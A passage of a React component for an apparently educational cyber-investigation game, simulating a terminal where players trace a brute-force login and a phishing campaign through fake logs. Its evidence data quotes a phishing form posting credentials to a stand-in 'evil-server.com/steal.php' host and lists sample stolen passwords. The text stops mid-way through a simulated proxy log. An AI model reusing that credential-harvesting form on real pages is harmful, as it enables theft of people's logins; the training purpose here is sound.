import React, { useState, useRef, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { X, Copy, Award, HelpCircle, Terminal as TerminalIcon } from 'lucide-react';
import TerminalLine from './TerminalLine';
import TerminalPrompt from './TerminalPrompt';
import GuidancePopup from '../../../components/os/GuidancePopup';
import { useCase } from '../../../contexts/CaseContext';
import './Terminal.css';

// ===========================================
// CASE #101 DISCOVERIES
// ===========================================
const case101Discoveries = [
  {
    id: 1,
    name: '3:00 AM Suspicious Login',
    description: 'You found the unauthorized login at 3:00 AM from IP 10.12.45.89',
    evidence: '2024-03-16 03:00:47 LOGIN_SUCCESS jdoe 10.12.45.89',
    xp: 15,
    source: 'auth.log',
    nextStep: 'Now verify if John was supposed to be working at 3 AM. Use Terminal to check his work schedule.',
    nextStepApp: 'terminal',
    nextStepCommand: 'cd employees && cat shifts.csv'
  },
  {
    id: 2,
    name: 'Attack Pattern Detected',
    description: 'Two failed attempts then success at 3 AM indicates an automated brute-force attack',
    evidence: '02:58:12 LOGIN_FAILED\n02:59:03 LOGIN_FAILED\n03:00:47 LOGIN_SUCCESS',
    xp: 15,
    source: 'auth.log',
    nextStep: 'This confirms it was an automated attack. Next, find WHY the attacker targeted John.',
    nextStepApp: 'terminal',
    nextStepCommand: 'cd system_info && cat permissions.txt'
  },
  {
    id: 3,
    name: 'John Was OFF Work',
    description: 'Verified John was not scheduled to work on March 16. His alibi checks out!',
    evidence: 'jdoe,2024-03-16,OFF  ← John was off work',
    xp: 15,
    source: 'shifts.csv',
    nextStep: 'Great! John is telling the truth. Now find out WHY the attacker targeted him.',
    nextStepApp: 'terminal',
    nextStepCommand: 'cd system_info && cat permissions.txt'
  },
  {
    id: 4,
    name: 'Unauthorized HR Access',
    description: 'John has HR access despite being in Marketing. This explains why attackers targeted him.',
    evidence: 'jdoe (Marketing): HR_READ, SALES_READ, MARKETING_WRITE',
    xp: 15,
    source: 'permissions.txt',
    nextStep: 'Now you know WHY. Investigate the suspicious IP address.',
    nextStepApp: 'terminal',
    nextStepCommand: "cd logs && grep '10.12.45.89' auth.log"
  },
  {
    id: 5,
    name: 'Suspicious IP Identified',
    description: 'IP 10.12.45.89 was only active at 3 AM, never during normal hours.',
    evidence: '02:58:12 LOGIN_FAILED\n02:59:03 LOGIN_FAILED\n03:00:47 LOGIN_SUCCESS\n03:15:22 QUERY_EXEC\n03:16:45 LOGOUT',
    xp: 15,
    source: 'auth.log (grep)',
    nextStep: 'You have all 5 discoveries! Go to Case Notes, write your conclusion, and submit the case.',
    nextStepApp: 'case-notes',
    nextStepCommand: null
  }
];

// ===========================================
// CASE #102 DISCOVERIES
// ===========================================
const case102Discoveries = [
  {
    id: 1,
    name: 'Phishing Email Found',
    description: 'You found the phishing email in SMTP logs',
    evidence: '14:32:04 DELIVERED FROM: IT-Support@company-reset.com TO: sarah, mike, lisa',
    xp: 15,
    source: 'smtp.log',
    nextStep: 'Check proxy logs to see who clicked the link',
    nextStepApp: 'log-viewer',
    nextStepCommand: 'Open proxy.log'
  },
  {
    id: 2,
    name: 'Victims Identified',
    description: 'Sarah (HR), Mike (Sales), and Lisa (Finance) visited the phishing site',
    evidence: '14:35 sarah company-reset.com/login\n14:36 mike company-reset.com/login\n14:38 lisa company-reset.com/login',
    xp: 15,
    source: 'proxy.log',
    nextStep: 'Examine the phishing page to see where credentials were sent',
    nextStepApp: 'file-explorer',
    nextStepCommand: 'Open suspicious_files/phishing_page.html'
  },
  {
    id: 3,
    name: 'Phishing Page Analyzed',
    description: 'The fake login page submits credentials to evil-server.com',
    evidence: '<form action="http://evil-server.com/steal.php" method="POST">',
    xp: 15,
    source: 'phishing_page.html',
    nextStep: 'Trace where evil-server.com is located',
    nextStepApp: 'terminal',
    nextStepCommand: 'nslookup evil-server.com'
  },
  {
    id: 4,
    name: 'Malicious Server Located',
    description: 'evil-server.com resolves to 185.142.53.89 in Russia',
    evidence: 'IP: 185.142.53.89\nLocation: Russia\nISP: Malicious Hosting Ltd',
    xp: 15,
    source: 'nslookup',
    nextStep: 'Find the stolen credentials file',
    nextStepApp: 'file-explorer',
    nextStepCommand: 'Check suspicious_files/credentials.txt'
  },
  {
    id: 5,
    name: 'Stolen Credentials Found',
    description: 'All three victims\' passwords were captured by the attacker',
    evidence: 'sarah:Summer2024!\nmike:sales123\nlisa:finance2024',
    xp: 15,
    source: 'credentials.txt',
    nextStep: 'Check if the attacker tried to use these credentials',
    nextStepApp: 'log-viewer',
    nextStepCommand: 'Open firewall.log and look for 185.142.53.89'
  },
  {
    id: 6,
    name: '2FA Saved the Day',
    description: 'Attacker tried to use stolen credentials at 11:15 PM but was blocked by 2FA',
    evidence: '23:15 VPN_ATTEMPT sarah 185.142.53.89\n23:16 VPN_FAILED sarah 185.142.53.89',
    xp: 15,
    source: 'firewall.log',
    nextStep: 'Write your conclusion in Case Notes',
    nextStepApp: 'case-notes',
    nextStepCommand: 'Document all 6 discoveries'
  }
];

const Terminal = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { activeCase } = useCase();
  
  // Get caseId from location state first, then context, then default to '101'
  const caseId = location.state?.caseId || activeCase || '101';
  
  // Get userId
  const { userId: navUserId } = location.state || {};
  const [userId, setUserId] = useState(navUserId);
  
  // Terminal state
  const [lines, setLines] = useState([]);
  const [commandHistory, setCommandHistory] = useState([]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const [currentPath, setCurrentPath] = useState(`/evidence/case${caseId}`);
  const [showGuidance, setShowGuidance] = useState(false);
  const [currentDiscovery, setCurrentDiscovery] = useState(null);
  const [copySuccess, setCopySuccess] = useState(false);
  const [copyMessage, setCopyMessage] = useState('');
  const [lastCommandOutput, setLastCommandOutput] = useState('');
  const [lastCommand, setLastCommand] = useState('');
  const [discoveries, setDiscoveries] = useState([]);
  const [totalXP, setTotalXP] = useState(0);
  const [pendingNavigation, setPendingNavigation] = useState(null); // Store navigation data
  
  const terminalRef = useRef(null);
  const inputRef = useRef(null);

  // Get userId from localStorage if not provided
  useEffect(() => {
    if (!userId) {
      const storedUser = localStorage.getItem('user');
      if (storedUser) {
        try {
          const user = JSON.parse(storedUser);
          setUserId(user._id);
          console.log('✅ Got userId from localStorage:', user._id);
        } catch (e) {
          console.error('Error parsing user from localStorage:', e);
        }
      }
    }
  }, [userId]);

  // Load discoveries from localStorage (case-specific)
  useEffect(() => {
    const savedDiscoveries = localStorage.getItem(`case${caseId}_discoveries`);
    const savedXP = localStorage.getItem(`case${caseId}_xp`);
    
    if (savedDiscoveries) {
      setDiscoveries(JSON.parse(savedDiscoveries));
    }
    if (savedXP) {
      setTotalXP(parseInt(savedXP));
    }
    
    // Reset path when case changes
    setCurrentPath(`/evidence/case${caseId}`);
    setLines([]);
    
    // Listen for updates
    const handleUpdate = () => {
      const updatedDiscoveries = localStorage.getItem(`case${caseId}_discoveries`);
      const updatedXP = localStorage.getItem(`case${caseId}_xp`);
      if (updatedDiscoveries) {
        setDiscoveries(JSON.parse(updatedDiscoveries));
      }
      if (updatedXP) {
        setTotalXP(parseInt(updatedXP));
      }
    };
    
    window.addEventListener('case-notes-updated', handleUpdate);
    return () => window.removeEventListener('case-notes-updated', handleUpdate);
  }, [caseId]);

  // Welcome message based on case
  useEffect(() => {
    const getWelcomeMessage = () => {
      if (caseId === '102') {
        return [
          { type: 'system', content: '╔══════════════════════════════════════════════════════════╗' },
          { type: 'system', content: '║         CRIMESOLVER OS TERMINAL v1.0                    ║' },
          { type: 'system', content: '╠══════════════════════════════════════════════════════════╣' },
          { type: 'system', content: '║                                                          ║' },
          { type: 'system', content: '║  🎣 CASE #102: The Phishing Trap                         ║' },
          { type: 'system', content: '║                                                          ║' },
          { type: 'system', content: '║  📊 YOUR PROGRESS:                                        ║' },
          { type: 'system', content: `║     • XP: ${totalXP}                                         ║` },
          { type: 'system', content: `║     • Discoveries: ${discoveries.length}/6                              ║` },
          { type: 'system', content: '║                                                          ║' },
          { type: 'system', content: '║  📁 BASIC COMMANDS:                                       ║' },
          { type: 'system', content: '║    ls              - List files                          ║' },
          { type: 'system', content: '║    cd [folder]     - Change directory                    ║' },
          { type: 'system', content: '║    cat [file]      - View file contents                   ║' },
          { type: 'system', content: '║    nslookup [domain] - DNS lookup                        ║' },
          { type: 'system', content: '║    hint            - Get guidance                        ║' },
          { type: 'system', content: '║    help            - Show all commands                   ║' },
          { type: 'system', content: '║                                                          ║' },
          { type: 'system', content: '║  📁 EVIDENCE LOCATIONS:                                   ║' },
          { type: 'system', content: '║    /evidence/case102/email_logs/     - smtp.log          ║' },
          { type: 'system', content: '║    /evidence/case102/network_logs/   - proxy.log, firewall.log ║' },
          { type: 'system', content: '║    /evidence/case102/employee_data/  - employees.csv     ║' },
          { type: 'system', content: '║    /evidence/case102/suspicious_files/ - phishing files  ║' },
          { type: 'warning', content: '║                                                          ║' },
          { type: 'warning', content: '║  💡 Type "hint" for what to do next!                     ║' },
          { type: 'system', content: '╚══════════════════════════════════════════════════════════╝' },
          { type: 'system', content: '' }
        ];
      } else {
        return [
          { type: 'system', content: '╔══════════════════════════════════════════════════════════╗' },
          { type: 'system', content: '║         CRIMESOLVER OS TERMINAL v1.0                    ║' },
          { type: 'system', content: '╠══════════════════════════════════════════════════════════╣' },
          { type: 'system', content: '║                                                          ║' },
          { type: 'system', content: '║  🔍 CASE #101: The Unauthorized Login                    ║' },
          { type: 'system', content: '║                                                          ║' },
          { type: 'system', content: '║  📊 YOUR PROGRESS:                                        ║' },
          { type: 'system', content: `║     • XP: ${totalXP}                                         ║` },
          { type: 'system', content: `║     • Discoveries: ${discoveries.length}/5                              ║` },
          { type: 'system', content: '║                                                          ║' },
          { type: 'system', content: '║  📁 BASIC COMMANDS:                                       ║' },
          { type: 'system', content: '║    ls              - List files                          ║' },
          { type: 'system', content: '║    cd [folder]     - Change directory                    ║' },
          { type: 'system', content: '║    cat [file]      - View file contents                   ║' },
          { type: 'system', content: '║    grep [text] [file] - Search in file                   ║' },
          { type: 'system', content: '║    hint            - Get guidance                        ║' },
          { type: 'system', content: '║    help            - Show all commands                   ║' },
          { type: 'system', content: '║                                                          ║' },
          { type: 'system', content: '║  📁 EVIDENCE LOCATIONS:                                   ║' },
          { type: 'system', content: '║    /evidence/case101/logs/      - auth.log               ║' },
          { type: 'system', content: '║    /evidence/case101/employees/ - shifts.csv              ║' },
          { type: 'system', content: '║    /evidence/case101/system_info/ - permissions.txt       ║' },
          { type: 'warning', content: '║                                                          ║' },
          { type: 'warning', content: '║  💡 Type "hint" for what to do next!                     ║' },
          { type: 'system', content: '╚══════════════════════════════════════════════════════════╝' },
          { type: 'system', content: '' }
        ];
      }
    };

    setLines(getWelcomeMessage());
  }, [caseId, discoveries.length, totalXP]);

  // Auto-scroll to bottom
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [lines]);

  // Focus input on mount
  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  const handleTerminalClick = () => {
    inputRef.current?.focus();
  };

  // Get next hint based on case
  const getNextHint = () => {
    if (caseId === '102') {
      const hasDiscovery1 = discoveries.includes(1);
      const hasDiscovery2 = discoveries.includes(2);
      const hasDiscovery3 = discoveries.includes(3);
      const hasDiscovery4 = discoveries.includes(4);
      const hasDiscovery5 = discoveries.includes(5);
      const hasDiscovery6 = discoveries.includes(6);

      if (hasDiscovery6) {
        return "✅ All discoveries found! Go to Case Notes and submit the case.";
      }
      if (hasDiscovery5 && !hasDiscovery6) {
        return "🔍 Check firewall.log to see if the attacker tried to use the stolen credentials.\n   Try: cd network_logs && cat firewall.log";
      }
      if (hasDiscovery4 && !hasDiscovery5) {
        return "🔍 Find the stolen credentials file.\n   Try: cd suspicious_files && cat credentials.txt";
      }
      if (hasDiscovery3 && !hasDiscovery4) {
        return "🔍 Trace where evil-server.com is located.\n   Try: nslookup evil-server.com";
      }
      if (hasDiscovery2 && !hasDiscovery3) {
        return "🔍 Examine the phishing page to see where credentials were sent.\n   Try: cd suspicious_files && cat phishing_page.html";
      }
      if (hasDiscovery1 && !hasDiscovery2) {
        return "🔍 Check proxy logs to see who clicked the link.\n   Try: cd network_logs && cat proxy.log";
      }
      return "🔍 Start by examining the email logs.\n   Try: cd email_logs && cat smtp.log";
    } else {
      const hasDiscovery1 = discoveries.includes(1);
      const hasDiscovery2 = discoveries.includes(2);
      const hasDiscovery3 = discoveries.includes(3);
      const hasDiscovery4 = discoveries.includes(4);
      const hasDiscovery5 = discoveries.includes(5);

      if (hasDiscovery5) {
        return "✅ All discoveries found! Go to Case Notes and submit the case.";
      }
      if (hasDiscovery1 && hasDiscovery2 && hasDiscovery3 && hasDiscovery4 && !hasDiscovery5) {
        return "🔍 You've found 4 discoveries! Now investigate the suspicious IP.\n   Try: cd logs && grep '10.12.45.89' auth.log";
      }
      if (!hasDiscovery3 && hasDiscovery1) {
        return "🔍 Check if John was supposed to be working on March 16.\n   Try: cd employees && cat shifts.csv";
      }
      if (!hasDiscovery4 && hasDiscovery3) {
        return "🔍 Find out WHY the attacker targeted John.\n   Try: cd system_info && cat permissions.txt";
      }
      if (!hasDiscovery1 || !hasDiscovery2) {
        return "🔍 Start by examining the logs in Log Viewer.\n   Find the 3 AM login and the attack pattern.";
      }
      if (hasDiscovery1 && !hasDiscovery2 && !hasDiscovery3) {
        return "🔍 Look at the pattern of attempts in Log Viewer.\n   Notice the failed attempts before success.";
      }
    }
    return "Try 'ls' to see what files are available.";
  };

  // ===========================================
  // CHECK FOR DISCOVERIES IN COMMAND OUTPUT
  // ===========================================
  const checkForDiscoveries = (command, output) => {
    let newDiscoveryIds = [];
    let xpEarned = 0;

    if (caseId === '102') {
      // Discovery 4: nslookup evil-server.com
      if (command.includes('nslookup evil-server.com') && 
          (output.includes('185.142.53.89') || output.includes('Russia'))) {
        newDiscoveryIds.push(4);
        xpEarned += 15;
      }
      
      // Discovery 3: cat phishing_page.html
      if (command.includes('cat phishing_page.html') && 
          output.includes('evil-server.com')) {
        newDiscoveryIds.push(3);
        xpEarned += 15;
      }
      
      // Discovery 5: cat credentials.txt
      if (command.includes('cat credentials.txt') && 
          (output.includes('Summer2024') || output.includes('sarah'))) {
        newDiscoveryIds.push(5);
        xpEarned += 15;
      }
      
      // Discovery 6: cat firewall.log
      if (command.includes('cat firewall.log') && 
          (output.includes('VPN_ATTEMPT') || output.includes('185.142.53.89'))) {
        newDiscoveryIds.push(6);
        xpEarned += 15;
      }
      
    } else {
      // Case #101 discoveries
      // Discovery 3: cat shifts.csv
      if (command.includes('cat shifts.csv') && 
          (output.includes('jdoe,2024-03-16,OFF') || output.includes('JOHN WAS OFF WORK'))) {
        newDiscoveryIds.push(3);
        xpEarned += 15;
      }

      // Discovery 4: cat permissions.txt
      if (command.includes('cat permissions.txt') && output.includes('HR_READ')) {
        newDiscoveryIds.push(4);
        xpEarned += 15;
      }

      // Discovery 5: grep with IP
      if (command.includes('grep') && command.includes('10.12.45.89') && 
          output.includes('Found 5 matches')) {
        newDiscoveryIds.push(5);
        xpEarned += 15;
      }
    }

    return { newDiscoveryIds, xpEarned };
  };

  // ===========================================
  // FIXED: HANDLE COPY TO NOTES - Shows popup then navigates after
  // ===========================================
  const handleCopyToNotes = () => {
    if (!lastCommandOutput) {
      setCopyMessage('No output to copy. Run a command first!');
      setCopySuccess(true);
      setTimeout(() => setCopySuccess(false), 2000);
      return;
    }

    const now = new Date();
    const timestamp = now.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }).replace(',', '');

    const { newDiscoveryIds, xpEarned } = checkForDiscoveries(lastCommand, lastCommandOutput);
    
    const discoveriesToAdd = newDiscoveryIds.filter(id => !discoveries.includes(id));
    const actualXPEarned = discoveriesToAdd.length * 15;

    console.log('🔍 Discoveries found:', { newDiscoveryIds, discoveriesToAdd, actualXPEarned });

    const getDiscoveryNames = (ids) => {
      if (caseId === '102') {
        const names = {
          3: 'Phishing Page Analyzed',
          4: 'Malicious Server Located',
          5: 'Stolen Credentials Found',
          6: '2FA Saved the Day'
        };
        return ids.map(id => names[id] || `Discovery #${id}`).join(', ');
      } else {
        const names = {
          3: 'John Was OFF Work',
          4: 'Unauthorized HR Access',
          5: 'Suspicious IP Identified'
        };
        return ids.map(id => names[id] || `Discovery #${id}`).join(', ');
      }
    };

    // Create note
    const newNote = {
      id: Date.now(),
      noteId: Date.now(),
      timestamp,
      title: discoveriesToAdd.length > 0 ? `DISCOVERY: ${getDiscoveryNames(discoveriesToAdd)}` : 'Terminal Output',
      content: lastCommandOutput,
      source: `Terminal: ${lastCommand}`,
      xp: actualXPEarned,
      isDiscovery: discoveriesToAdd.length > 0,
      caseId: caseId,
      discoveryId: discoveriesToAdd.length > 0 ? discoveriesToAdd[0] : null,
      createdAt: new Date().toISOString(),
      type: 'note'
    };

    // Save to localStorage
    const existingNotes = JSON.parse(localStorage.getItem(`case${caseId}_notes`) || '[]');
    const updatedNotes = [newNote, ...existingNotes];
    localStorage.setItem(`case${caseId}_notes`, JSON.stringify(updatedNotes));
    
    // Update discoveries in localStorage
    if (discoveriesToAdd.length > 0) {
      const updatedDiscoveries = [...discoveries, ...discoveriesToAdd];
      const updatedXP = totalXP + actualXPEarned;
      
      localStorage.setItem(`case${caseId}_discoveries`, JSON.stringify(updatedDiscoveries));
      localStorage.setItem(`case${caseId}_xp`, updatedXP.toString());
      
      setDiscoveries(updatedDiscoveries);
      setTotalXP(updatedXP);
      
      setCopyMessage(`🎉 NEW DISCOVERY! +${actualXPEarned} XP`);
      
      // ===== FIXED: Show guidance popup and store navigation data =====
      let discoveryDetails = null;
      if (caseId === '102') {
        discoveryDetails = case102Discoveries.find(d => d.id === discoveriesToAdd[0]);
      } else {
        discoveryDetails = case101Discoveries.find(d => d.id === discoveriesToAdd[0]);
      }
      
      if (discoveryDetails) {
        console.log('✅ Found discovery details:', discoveryDetails);
        
        // Create a clean copy of the discovery with all required fields
        const popupDiscovery = {
          id: discoveryDetails.id,
          name: discoveryDetails.name,
          description: discoveryDetails.description,
          xp: discoveryDetails.xp,
          nextStep: discoveryDetails.nextStep,
          nextStepApp: discoveryDetails.nextStepApp,
          nextStepCommand: discoveryDetails.nextStepCommand,
          evidence: lastCommandOutput
        };
        
        console.log('🎯 Setting popup discovery:', popupDiscovery);
        setCurrentDiscovery(popupDiscovery);
        setShowGuidance(true);
        
        // Store navigation data for after popup closes
        setPendingNavigation({
          userId: userId,
          caseId: `#${caseId}`,
          newNote: newNote,
          discoveryId: discoveriesToAdd[0],
          xpEarned: actualXPEarned,
          isNewDiscovery: true
        });
      } else {
        console.error('❌ Could not find discovery details for ID:', discoveriesToAdd[0]);
        // If no popup, navigate immediately
        navigate('/case-notes', {
          state: {
            userId: userId,
            caseId: `#${caseId}`,
            newNote: newNote,
            discoveryId: discoveriesToAdd.length > 0 ? discoveriesToAdd[0] : null,
            xpEarned: actualXPEarned,
            isNewDiscovery: discoveriesToAdd.length > 0
          }
        });
      }

      const totalDiscoveries = caseId === '102' ? 6 : 5;
      if (discoveries.length + discoveriesToAdd.length === totalDiscoveries) {
        setLines(prev => [...prev,
          { type: 'system', content: '' },
          { type: 'warning', content: `🎉 CONGRATULATIONS! You have found all ${totalDiscoveries} discoveries!` },
          { type: 'warning', content: '   Go to Case Notes, write your conclusion, and submit the case!' },
          { type: 'system', content: '' }
        ]);
      }
    } else {
      setCopyMessage(`📋 Copied terminal output to notes`);
      // No discovery, navigate immediately
      navigate('/case-notes', {
        state: {
          userId: userId,
          caseId: `#${caseId}`,
          newNote: newNote,
          discoveryId: null,
          xpEarned: 0,
          isNewDiscovery: false
        }
      });
    }
    
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 3000);
    
    // Dispatch event to notify other components
    window.dispatchEvent(new CustomEvent('case-notes-updated', { 
      detail: { 
        caseId: caseId,
        notes: updatedNotes, 
        discoveries: discoveriesToAdd, 
        xp: actualXPEarned 
      }
    }));
  };

  // ===== FIXED: Handle popup action =====
  const handlePopupAction = (app) => {
    console.log('Popup action clicked:', app);
    setShowGuidance(false);
    setCurrentDiscovery(null);
    
    if (app === 'terminal') {
      // Stay in terminal, focus input
      inputRef.current?.focus();
      // Clear pending navigation if any
      setPendingNavigation(null);
    } else if (app === 'case-notes') {
      // Use pending navigation if available, otherwise just go to case notes
      if (pendingNavigation) {
        navigate('/case-notes', { state: pendingNavigation });
        setPendingNavigation(null);
      } else {
        navigate('/case-notes', { state: { userId, caseId: `#${caseId}` } });
      }
    } else if (app === 'file-explorer') {
      navigate('/file-explorer', { state: { userId, caseId: `#${caseId}` } });
    } else if (app === 'log-viewer') {
      navigate('/log-viewer', { state: { userId, caseId: `#${caseId}` } });
    }
  };

  // ===== FIXED: Handle popup close (auto or manual) =====
  const handlePopupClose = () => {
    console.log('Popup closed');
    setShowGuidance(false);
    setCurrentDiscovery(null);
    
    // Navigate to case notes with pending data
    if (pendingNavigation) {
      navigate('/case-notes', { state: pendingNavigation });
      setPendingNavigation(null);
    }
  };

  // Process command
  const processCommand = (input) => {
    const cmd = input.trim().toLowerCase();
    const args = cmd.split(' ');
    const mainCmd = args[0];

    setLastCommand(input);

    if (!cmd) return [];

    if (mainCmd === 'hint') {
      return ['', '🔍 HINT:', getNextHint(), ''];
    }

    if (mainCmd === 'help') {
      if (caseId === '102') {
        return [
          'Available commands:',
          '  ls              - List files',
          '  cd [folder]     - Change directory',
          '  cat [file]      - View file',
          '  nslookup [domain] - DNS lookup',
          '  pwd             - Show current path',
          '  clear           - Clear screen',
          '  hint            - Get guidance',
          '',
          'Example: nslookup evil-server.com',
          ''
        ];
      } else {
        return [
          'Available commands:',
          '  ls              - List files',
          '  cd [folder]     - Change directory',
          '  cat [file]      - View file',
          '  grep [text] [file] - Search in file',
          '  pwd             - Show current path',
          '  clear           - Clear screen',
          '  hint            - Get guidance',
          '',
          'Example: cd employees && cat shifts.csv',
          ''
        ];
      }
    }

    if (mainCmd === 'pwd') {
      return [currentPath];
    }

    if (mainCmd === 'clear') {
      setLines([]);
      return [];
    }

    if (mainCmd === 'ls') {
      if (caseId === '102') {
        if (currentPath === `/evidence/case102`) {
          return ['email_logs/', 'network_logs/', 'employee_data/', 'suspicious_files/', 'README.txt'];
        }
        if (currentPath === `/evidence/case102/email_logs`) {
          return ['smtp.log', 'spam_filter.log', 'webmail_access.log'];
        }
        if (currentPath === `/evidence/case102/network_logs`) {
          return ['dns_queries.log', 'proxy.log', 'firewall.log'];
        }
        if (currentPath === `/evidence/case102/employee_data`) {
          return ['employees.csv', 'login_history.csv', 'training_records.csv'];
        }
        if (currentPath === `/evidence/case102/suspicious_files`) {
          return ['phishing_page.html', 'credentials.txt', 'hashes.txt'];
        }
        return [];
      } else {
        if (currentPath === `/evidence/case101`) {
          return ['logs/', 'employees/', 'system_info/', 'README.txt'];
        }
        if (currentPath === `/evidence/case101/logs`) {
          return ['auth.log', 'access.log', 'error.log'];
        }
        if (currentPath === `/evidence/case101/employees`) {
          return ['employees.csv', 'shifts.csv'];
        }
        if (currentPath === `/evidence/case101/system_info`) {
          return ['permissions.txt', 'network_config.txt'];
        }
        return [];
      }
    }

    if (mainCmd === 'cd') {
      if (args.length < 2) return ['Usage: cd [folder]'];
      
      const target = args[1];
      
      if (target === '..') {
        const parts = currentPath.split('/');
        if (parts.length > 3) {
          parts.pop();
          const newPath = parts.join('/');
          setCurrentPath(newPath);
          return [];
        }
        return ['Already at root'];
      }
      
      const basePath = `/evidence/case${caseId}`;
      
      if (currentPath === basePath) {
        if (caseId === '102') {
          if (target === 'email_logs' || target === 'email_logs/') {
            setCurrentPath(`${basePath}/email_logs`);
            return [];
          }
          if (target === 'network_logs' || target === 'network_logs/') {
            setCurrentPath(`${basePath}/network_logs`);
            return [];
          }
          if (target === 'employee_data' || target === 'employee_data/') {
            setCurrentPath(`${basePath}/employee_data`);
            return [];
          }
          if (target === 'suspicious_files' || target === 'suspicious_files/') {
            setCurrentPath(`${basePath}/suspicious_files`);
            return [];
          }
        } else {
          if (target === 'logs' || target === 'logs/') {
            setCurrentPath(`${basePath}/logs`);
            return [];
          }
          if (target === 'employees' || target === 'employees/') {
            setCurrentPath(`${basePath}/employees`);
            return [];
          }
          if (target === 'system_info' || target === 'system_info/') {
            setCurrentPath(`${basePath}/system_info`);
            return [];
          }
        }
      }
      
      // Allow cd from anywhere to any folder
      if (caseId === '102') {
        if (target === 'email_logs') {
          setCurrentPath(`/evidence/case102/email_logs`);
          return [];
        }
        if (target === 'network_logs') {
          setCurrentPath(`/evidence/case102/network_logs`);
          return [];
        }
        if (target === 'employee_data') {
          setCurrentPath(`/evidence/case102/employee_data`);
          return [];
        }
        if (target === 'suspicious_files') {
          setCurrentPath(`/evidence/case102/suspicious_files`);
          return [];
        }
      } else {
        if (target === 'logs') {
          setCurrentPath(`/evidence/case101/logs`);
          return [];
        }
        if (target === 'employees') {
          setCurrentPath(`/evidence/case101/employees`);
          return [];
        }
        if (target === 'system_info') {
          setCurrentPath(`/evidence/case101/system_info`);
          return [];
        }
      }
      
      return [`cd: ${target}: No such directory`];
    }

    // NSLOOKUP command for Case #102
    if (mainCmd === 'nslookup') {
      if (args.length < 2) return ['Usage: nslookup [domain]'];
      
      const domain = args[1];
      
      if (domain === 'evil-server.com' || domain === 'evil-server') {
        const output = [
          '',
          'Server:    8.8.8.8',
          'Address:   8.8.8.8#53',
          '',
          'Non-authoritative answer:',
          `Name:      ${domain}`,
          'Address:   185.142.53.89',
          '',
          '────────────────────────────────────',
          '📍 GEOIP INFORMATION:',
          '   Country: Russia',
          '   City: Moscow',
          '   ISP: Malicious Hosting Ltd',
          '   Reputation: Known phishing infrastructure',
          '────────────────────────────────────',
          '',
          '══════════════════════════════════════════════════',
          '✅ Click COPY TO NOTES to save this discovery! (+15 XP) ⭐ DISCOVERY #4'
        ];
        const outputString = output.join('\n');
        setLastCommandOutput(outputString);
        return output;
      }
      
      setLastCommandOutput(`nslookup: cannot find ${domain}: Non-existent domain`);
      return [`nslookup: cannot find ${domain}: Non-existent domain`];
    }

    if (mainCmd === 'cat') {
      if (args.length < 2) return ['Usage: cat [file]'];
      
      const file = args[1];
      
      if (caseId === '102') {
        // ===========================================
        // FIREWALL.LOG - DISCOVERY 6
        // ===========================================
        if ((currentPath.includes('network_logs') || currentPath.includes('network')) && 
            (file === 'firewall.log' || file === 'firewall')) {
          const output = [
            '2024-03-15 08:00:12 | VPN_CONNECT | sarah | 10.0.0.45',
            '2024-03-15 08:15:33 | VPN_CONNECT | mike  | 10.0.0.67',
            '2024-03-15 08:30:45 | VPN_CONNECT | lisa  | 10.0.0.89',
            '2024-03-15 09:00:22 | VPN_CONNECT | sarah | 10.0.0.45',
            '2024-03-15 10:30:08 | VPN_CONNECT | mike  | 10.0.0.67',
            '2024-03-15 12:00:19 | VPN_CONNECT | lisa  | 10.0.0.89',
            '',
            '🔴 2024-03-15 23:15:22 | VPN_ATTEMPT | sarah | 185.142.53.89',
            '🔴 2024-03-15 23:16:45 | VPN_FAILED  | sarah | 185.142.53.89',
            '🔴 2024-03-15 23:18:12 | VPN_ATTEMPT | lisa  | 185.142.53.89',
            '🔴 2024-03-15 23:19:33 | VPN_FAILED  | lisa  | 185.142.53.89',
            '🔴 2024-03-15 23:22:18 | VPN_ATTEMPT | mike  | 185.142.53.89',
            '🔴 2024-03-15 23:23:07 | VPN_FAILED  | mike  | 185.142.53.89',
            '',
            '────────────────────────────────────',
            '⚠️ The attacker tried to use stolen credentials at 11:15 PM!',
            '✅ All attempts FAILED because of 2FA!',
            '',
            '══════════════════════════════════════════════════',
            '✅ Click COPY TO NOTES to save this discovery! (+15 XP) ⭐ DISCOVERY #6'
          ];
          const outputString = output.join('\n');
          setLastCommandOutput(outputString);
          return output;
        }
        
        // SMTP.LOG
        if ((currentPath.includes('email_logs') || currentPath.includes('email')) && 
            (file === 'smtp.log' || file === 'smtp')) {
          const output = [
            '2024-03-15 08:15:22 | DELIVERED | external@evil.com | ALL',
            '2024-03-15 08:16:45 | DELIVERED | newsletter@company.com | sarah',
            '2024-03-15 08:22:13 | DELIVERED | client@biz.com | mike',
            '2024-03-15 09:30:07 | DELIVERED | hr@company.com | all-staff',
            '2024-03-15 10:15:32 | DELIVERED | sales@partner.com | mike',
            '2024-03-15 11:00:18 | DELIVERED | it-support@company.com | lisa',
            '',
            '🔴 2024-03-15 14:32:04 | DELIVERED | IT-Support@company-reset.com | sarah  ← ⭐ PHISHING',
            '🔴 2024-03-15 14:32:05 | DELIVERED | IT-Support@company-reset.com | mike   ← ⭐ PHISHING',
            '🔴 2024-03-15 14:32:06 | DELIVERED | IT-Support@company-reset.com | lisa   ← ⭐ PHISHING',
            '🔴 2024-03-15 14:32:07 | DELIVERED | IT-Support@company-reset.com | 12 more employees',
            '🔴 2024-03-15 14:33:22 | SPAM_FLAG | IT-Support@company-reset.com | -',
            '',
            '────────────────────────────────────',
            '💡 Open this file in Log Viewer to save Discovery #1!'
          ];
          const outputString = output.join('\n');
          setLastCommandOutput(outputString);
          return output;
        }
        
        // PROXY.LOG
        if ((currentPath.includes('network_logs') || currentPath.includes('network')) && 
            (file === 'proxy.log' || file === 'proxy')) {
          const output = [
            '2024-03-15 08:30:12 | sarah | company.com/hr',
            '2024-03-15 08:45:33 | mike  | company.com/sales',
            '2024-03-15 09:12:45 | lisa  | company.com/finance',
            '2024-03-15 10:30:22 | sarah | company.com/benefits',
            '2024-03-15 11:15:08 | mike  | google.com/search',
            '2024-03-15 13:45:19 | lisa  | company.com/reports',
            '',
            '🔴 2024-03-15 14:35:22 | sarah | company-reset.com/login',
